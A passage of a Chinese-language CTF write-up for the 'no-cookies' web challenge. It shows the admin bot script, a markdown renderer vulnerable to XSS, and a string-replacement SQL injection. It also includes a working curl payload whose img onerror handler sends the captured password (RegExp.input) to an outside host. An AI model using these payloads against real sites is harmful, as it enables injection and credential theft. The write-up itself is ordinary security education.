+          <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#75af00>once</span><span style=color:#111>(</span><span style=color:#d88200>&#39;dialog&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>second</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+            <span style=color:#75af00>second</span><span style=color:#111>.</span><span style=color:#75af00>accept</span><span style=color:#111>(</span><span style=color:#75af00>password</span><span style=color:#111>);</span>
+          <span style=color:#111>});</span>
+          <span style=color:#75af00>first</span><span style=color:#111>.</span><span style=color:#75af00>accept</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>);</span>
+          <span style=color:#75af00>resolve</span><span style=color:#111>();</span>
+        <span style=color:#111>});</span>
+      <span style=color:#111>});</span>
+    <span style=color:#111>};</span>
+
+    <span style=color:#75715e>// make an account
+</span><span style=color:#75715e></span>    <span style=color:#00a8c8>const</span> <span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#111>Array</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>)</span>
+      <span style=color:#111>.</span><span style=color:#75af00>fill</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
+      <span style=color:#111>.</span><span style=color:#75af00>map</span><span style=color:#111>(()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>Math</span><span style=color:#111>.</span><span style=color:#75af00>floor</span><span style=color:#111>(</span><span style=color:#111>Math</span><span style=color:#111>.</span><span style=color:#75af00>random</span><span style=color:#111>()</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>(</span><span style=color:#ae81ff>16</span><span style=color:#111>))</span>
+      <span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>  <span style=color:#75715e>// 用户名任意
+</span><span style=color:#75715e></span>    <span style=color:#00a8c8>const</span> <span style=color:#75af00>password</span> <span style=color:#f92672>=</span> <span style=color:#75af00>flag</span><span style=color:#111>;</span>  <span style=color:#75715e>// 我们要得到的flag 在密码中
+</span><span style=color:#75715e></span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>firstLogin</span> <span style=color:#f92672>=</span> <span style=color:#75af00>doLogin</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>,</span> <span style=color:#75af00>password</span><span style=color:#111>);</span>
+
+    <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#00a8c8>goto</span><span style=color:#111>(</span><span style=color:#d88200>`https://no-cookies-</span><span style=color:#d88200>${</span><span style=color:#75af00>instance</span><span style=color:#d88200>}</span><span style=color:#d88200>.mc.ax/register`</span><span style=color:#111>);</span> <span style=color:#75715e>// 注册
+</span><span style=color:#75715e></span>    <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>{}</span>
+
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>firstLogin</span><span style=color:#111>;</span> <span style=color:#75715e>// 登入
+</span><span style=color:#75715e></span>
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>sleep</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>);</span>
+
+    <span style=color:#75715e>// visit the note and log in
+</span><span style=color:#75715e></span>    <span style=color:#00a8c8>const</span> <span style=color:#75af00>secondLogin</span> <span style=color:#f92672>=</span> <span style=color:#75af00>doLogin</span><span style=color:#111>(</span><span style=color:#75af00>username</span><span style=color:#111>,</span> <span style=color:#75af00>password</span><span style=color:#111>);</span>  <span style=color:#75715e>// 再登入
+</span><span style=color:#75715e></span>
+    <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>page</span><span style=color:#111>.</span><span style=color:#00a8c8>goto</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>);</span> <span style=color:#75715e>// 访问我们的url
+</span><span style=color:#75715e></span>    <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>{}</span>
+
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>secondLogin</span><span style=color:#111>;</span>
+
+    <span style=color:#00a8c8>await</span> <span style=color:#75af00>sleep</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>);</span>
+  <span style=color:#111>},</span>
+<span style=color:#111>};</span>
+
+</code></pre></div><p>看我们的index.js，页面不管什么操作，/register, /login, /create, /view都会先要求输入账号密码，我们可以创建md的内容并渲染出来，在/view处有这样的js</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>(()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>validate</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>text</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#d88200>/^[^$&#39;]+$/</span><span style=color:#111>.</span><span style=color:#75af00>test</span><span style=color:#111>(</span><span style=color:#75af00>text</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>	<span style=color:#75715e>// 过滤 没过滤双引号
+</span><span style=color:#75715e></span>  <span style=color:#111>}</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>promptValid</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>text</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>let</span> <span style=color:#75af00>result</span> <span style=color:#f92672>=</span> <span style=color:#75af00>prompt</span><span style=color:#111>(</span><span style=color:#75af00>text</span><span style=color:#111>)</span> <span style=color:#f92672>??</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#75af00>validate</span><span style=color:#111>(</span><span style=color:#75af00>result</span><span style=color:#111>)</span> <span style=color:#f92672>?</span> <span style=color:#75af00>result</span> <span style=color:#f92672>:</span> <span style=color:#75af00>promptValid</span><span style=color:#111>(</span><span style=color:#75af00>text</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#75af00>promptValid</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Username:&#39;</span><span style=color:#111>);</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>password</span> <span style=color:#f92672>=</span> <span style=color:#75af00>promptValid</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Password:&#39;</span><span style=color:#111>);</span>	<span style=color:#75715e>// 上一次正则
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>const</span> <span style=color:#75af00>params</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>URLSearchParams</span><span style=color:#111>(</span><span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>location</span><span style=color:#111>.</span><span style=color:#75af00>search</span><span style=color:#111>);</span>
+  <span style=color:#111>(</span><span style=color:#00a8c8>async</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#111>{</span> <span style=color:#75af00>note</span><span style=color:#111>,</span> <span style=color:#75af00>mode</span><span style=color:#111>,</span> <span style=color:#75af00>views</span> <span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#111>(</span><span style=color:#00a8c8>await</span> <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/view&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>method</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>,</span>
+      <span style=color:#75af00>headers</span><span style=color:#f92672>:</span> <span style=color:#111>{</span>
+        <span style=color:#d88200>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;application/json&#39;</span><span style=color:#111>,</span>
+      <span style=color:#111>},</span>
+      <span style=color:#75af00>body</span><span style=color:#f92672>:</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>({</span>
+        <span style=color:#75af00>username</span><span style=color:#111>,</span>
+        <span style=color:#75af00>password</span><span style=color:#111>,</span>
+        <span style=color:#75af00>id</span><span style=color:#f92672>:</span> <span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>)</span>
+      <span style=color:#111>})</span>
+    <span style=color:#111>})).</span><span style=color:#75af00>json</span><span style=color:#111>();</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>note</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>alert</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Invalid username, password, or note id&#39;</span><span style=color:#111>);</span>
+      <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>location</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>;</span>
+      <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
+    <span style=color:#111>}</span>
+    <span style=color:#00a8c8>let</span> <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>note</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>mode</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#39;markdown&#39;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+      <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/\[([^\]]+)\]\(([^\)]+)\)/g</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>match</span><span style=color:#111>,</span> <span style=color:#75af00>p1</span><span style=color:#111>,</span> <span style=color:#75af00>p2</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>	<span style=color:#75715e>// 正则
+</span><span style=color:#75715e></span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>`&lt;a href=&#34;</span><span style=color:#d88200>${</span><span style=color:#75af00>p2</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;&gt;</span><span style=color:#d88200>${</span><span style=color:#75af00>p1</span><span style=color:#d88200>}</span><span style=color:#d88200>&lt;/a&gt;`</span><span style=color:#111>;</span>	<span style=color:#75715e>// xss处
+</span><span style=color:#75715e></span>      <span style=color:#111>});</span>
+      <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/#\s*([^\n]+)/g</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>match</span><span style=color:#111>,</span> <span style=color:#75af00>p1</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>`&lt;h1&gt;</span><span style=color:#d88200>${</span><span style=color:#75af00>p1</span><span style=color:#d88200>}</span><span style=color:#d88200>&lt;/h1&gt;`</span><span style=color:#111>;</span>
+      <span style=color:#111>});</span>
+      <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/\*\*([^\n]+)\*\*/g</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>match</span><span style=color:#111>,</span> <span style=color:#75af00>p1</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>`&lt;strong&gt;</span><span style=color:#d88200>${</span><span style=color:#75af00>p1</span><span style=color:#d88200>}</span><span style=color:#d88200>&lt;/strong&gt;`</span><span style=color:#111>;</span>
+      <span style=color:#111>});</span>
+      <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/\*([^\n]+)\*/g</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>match</span><span style=color:#111>,</span> <span style=color:#75af00>p1</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>`&lt;em&gt;</span><span style=color:#d88200>${</span><span style=color:#75af00>p1</span><span style=color:#d88200>}</span><span style=color:#d88200>&lt;/em&gt;`</span><span style=color:#111>;</span>
+      <span style=color:#111>});</span>
+    <span style=color:#111>}</span>
+    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.note&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>;</span>	<span style=color:#75715e>// 插入页面中
+</span><span style=color:#75715e></span>    <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.views&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerText</span> <span style=color:#f92672>=</span> <span style=color:#75af00>views</span><span style=color:#111>;</span>
+  <span style=color:#111>})();</span>
+<span style=color:#111>})();</span>
+</code></pre></div><p>比较容易注意到这个xss点，它可以渲染超链接，但是没过滤双引号，导致我们可以这样</p>
+<pre tabindex=0><code>// md
+(link text)[http://example.com&quot; class=&quot;foo]
+// innerHTML
+&lt;a href=&quot;http://example.com&quot; class=&quot;foo&quot;&gt;link text&lt;/a&gt;
+</code></pre><p>可以构造出这样的payload</p>
+<pre tabindex=0><code>// md
+(link text)[http://example.com&quot; onmouseover=&quot;alert`1`]
+// innerHTML
+&lt;a href=&quot;http://example.com&quot; onmouseover=&quot;alert`1`&gt;link text&lt;/a&gt;
+</code></pre><p>不过admin无鼠标操作，这里要结合js正则匹配的特性，<code>RegExp.input</code>可以拿到上一次传入正则匹配函数中的输入值</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#d88200>/a/</span><span style=color:#111>.</span><span style=color:#75af00>test</span><span style=color:#111>(</span><span style=color:#d88200>&#39;secret password&#39;</span><span style=color:#111>)</span>
+<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#111>RegExp</span><span style=color:#111>.</span><span style=color:#75af00>input</span><span style=color:#111>)</span> <span style=color:#75715e>// secret password
+</span></code></pre></div><p>不过仅有这一个xss点还不行，含有这样payload的note必须插入后得到一个admin能访问的url，这里就需要后端的sqlite注入了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>const</span> <span style=color:#75af00>db</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+  <span style=color:#75af00>prepare</span><span style=color:#f92672>:</span> <span style=color:#111>(</span><span style=color:#75af00>query</span><span style=color:#111>,</span> <span style=color:#75af00>params</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>params</span><span style=color:#111>)</span>
+      <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>,</span> <span style=color:#75af00>value</span><span style=color:#111>]</span> <span style=color:#00a8c8>of</span> <span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>entries</span><span style=color:#111>(</span><span style=color:#75af00>params</span><span style=color:#111>))</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>const</span> <span style=color:#75af00>clean</span> <span style=color:#f92672>=</span> <span style=color:#75af00>value</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/[&#39;$]/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>
+        <span style=color:#75af00>query</span> <span style=color:#f92672>=</span> <span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>replaceAll</span><span style=color:#111>(</span><span style=color:#d88200>`:</span><span style=color:#d88200>${</span><span style=color:#75af00>key</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>,</span> <span style=color:#d88200>`&#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>clean</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;`</span><span style=color:#111>);</span>
+      <span style=color:#111>}</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#75af00>query</span><span style=color:#111>;</span>
+  <span style=color:#111>},</span>
+
+<span style=color:#111>[...]</span>
+  <span style=color:#75af00>run</span><span style=color:#f92672>:</span> <span style=color:#111>(</span><span style=color:#75af00>query</span><span style=color:#111>,</span> <span style=color:#75af00>params</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>prepared</span> <span style=color:#f92672>=</span> <span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>prepare</span><span style=color:#111>(</span><span style=color:#75af00>query</span><span style=color:#111>,</span> <span style=color:#75af00>params</span><span style=color:#111>);</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span> <span style=color:#75af00>prepared</span> <span style=color:#111>);</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#75af00>database</span><span style=color:#111>.</span><span style=color:#75af00>prepare</span><span style=color:#111>(</span><span style=color:#75af00>prepared</span><span style=color:#111>).</span><span style=color:#75af00>run</span><span style=color:#111>();</span>
+  <span style=color:#111>},</span>
+<span style=color:#111>};</span>
+<span style=color:#111>[...]</span>
+
+  <span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>run</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>id</span><span style=color:#111>,</span>
+    <span style=color:#75af00>username</span><span style=color:#111>,</span>
+    <span style=color:#75af00>note</span><span style=color:#f92672>:</span> <span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/[&lt;&gt;]/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>),</span>
+    <span style=color:#75af00>mode</span><span style=color:#111>,</span>
+  <span style=color:#111>});</span>
+</code></pre></div><p>注意看db的操作</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>,</span> <span style=color:#75af00>value</span><span style=color:#111>]</span> <span style=color:#00a8c8>of</span> <span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>entries</span><span style=color:#111>(</span><span style=color:#75af00>params</span><span style=color:#111>))</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>const</span> <span style=color:#75af00>clean</span> <span style=color:#f92672>=</span> <span style=color:#75af00>value</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/[&#39;$]/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>
+    <span style=color:#75af00>query</span> <span style=color:#f92672>=</span> <span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>replaceAll</span><span style=color:#111>(</span><span style=color:#d88200>`:</span><span style=color:#d88200>${</span><span style=color:#75af00>key</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>,</span> <span style=color:#d88200>`&#39;</span><span style=color:#d88200>${</span><span style=color:#75af00>clean</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;`</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>对传入的每一对参数，按顺序，先把所有的单引号和<code>$</code>去掉，再替换<code>:param</code>为<code>'clean'</code></p>
+<p>在后面/create中会依次传入四个参数</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75af00>db</span><span style=color:#111>.</span><span style=color:#75af00>run</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>id</span><span style=color:#111>,</span>
+    <span style=color:#75af00>username</span><span style=color:#111>,</span>
+    <span style=color:#75af00>note</span><span style=color:#f92672>:</span> <span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/[&lt;&gt;]/g</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>),</span>
+    <span style=color:#75af00>mode</span><span style=color:#111>,</span>
+<span style=color:#111>});</span>
+</code></pre></div><p>payload是这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#d88200>&#34;username&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;a :note&#34;</span><span style=color:#111>,</span>
+<span style=color:#d88200>&#34;password&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;pass&#34;</span>
+<span style=color:#d88200>&#34;note&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;, :mode, 0, 0) -- &#34;</span><span style=color:#111>,</span>
+<span style=color:#d88200>&#34;mode&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;actual note and xss&#34;</span>
+</code></pre></div><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 原
+INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)
+
+-- id 123
+INSERT INTO notes VALUES ('123', :username, :note, :mode, 0)
+
+-- username
+INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0)
+
+-- note 两个`:note`都会被换掉
+INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0)
+
+-- mode 此时note值我们完全可控
+INSERT INTO notes VALUES ('123', 'a ', 'actual note and xss', 0, 0) -- '', ', :mode, 0, 0) -- ', 'actual note and xss', 0)
+</code></pre><p>所以结合上面，我们最终的payload是这样的</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>$ curl <span style=color:#d88200>&#39;https://no-cookies-0ac0b52c95f3abe3.mc.ax/create&#39;</span> -H <span style=color:#d88200>&#39;Content-Type: application/json&#39;</span> --data-raw <span style=color:#d88200>&#39;{&#34;username&#34;:&#34;:note&#34;,&#34;password&#34;:&#34;password&#34;,&#34;note&#34;:&#34;,:mode, 22, 0)-- &#34;,&#34;mode&#34;:&#34;&lt;img src=x onerror=\&#34;window.location=&amp;quot;https://bawolff.net?&amp;quot;+RegExp.input\&#34;&gt;&#34;}&#39;</span>
+</code></pre></div><h3 id=非预期>非预期</h3>
+<p>当然逃不了js大手子们的非预期解了，非预期没有用到<code>RegExp.input</code>，而是</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.note&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#75af00>text</span><span style=color:#111>;</span>
+<span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>querySelector</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.views&#39;</span><span style=color:#111>).</span><span style=color:#75af00>innerText</span> <span style=color:#f92672>=</span> <span style=color:#75af00>views</span><span style=color:#111>;</span>
+</code></pre></div><p>有两种情况</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>x</span><span style=color:#111>&gt;&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>y</span><span style=color:#111>&gt;</span>hello<span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+    <span style=color:#75af00>x</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&lt;img src=x onerror=alert(window.y.innerText)&gt;&#39;</span>
+    <span style=color:#75af00>y</span><span style=color:#111>.</span><span style=color:#75af00>innerText</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;updated&#39;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>此时alert的内容是<code>updated</code>，而如果换成<code>&lt;svg></code>就不一样了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>x</span><span style=color:#111>&gt;&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;</span><span style=color:#f92672>div</span> <span style=color:#75af00>id</span><span style=color:#f92672>=</span><span style=color:#d88200>y</span><span style=color:#111>&gt;</span>hello<span style=color:#111>&lt;/</span><span style=color:#f92672>div</span><span style=color:#111>&gt;</span>
+<span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+    <span style=color:#75af00>x</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&lt;svg&gt;&lt;svg onload=alert(window.y.innerText)&gt;&#39;</span>
+    <span style=color:#75af00>y</span><span style=color:#111>.</span><span style=color:#75af00>innerText</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;updated&#39;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>它alert的是前面的<code>hello</code></p>
+<p>而渲染页面的js代码简化后是这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>(</span><span style=color:#00a8c8>async</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#111>{</span> <span style=color:#75af00>note</span><span style=color:#111>,</span> <span style=color:#75af00>mode</span><span style=color:#111>,</span> <span style=color:#75af00>views</span> <span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#111>(</span><span style=color:#00a8c8>await</span> <span style=color:#75af00>fetch</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/view&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>method</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>,</span>
+    <span style=color:#75af00>headers</span><span style=color:#f92672>:</span> <span style=color:#111>{</span>
+      <span style=color:#d88200>&#39;Content-Type&#39;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;application/json&#39;</span><span style=color:#111>,</span>
+    <span style=color:#111>},</span>
+    <span style=color:#75af00>body</span><span style=color:#f92672>:</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>({</span>
+      <span style=color:#75af00>username</span><span style=color:#111>,</span>
+      <span style=color:#75af00>password</span><span style=color:#111>,</span>
+      <span style=color:#75af00>id</span><span style=color:#f92672>:</span> <span style=color:#75af00>params</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>)</span>
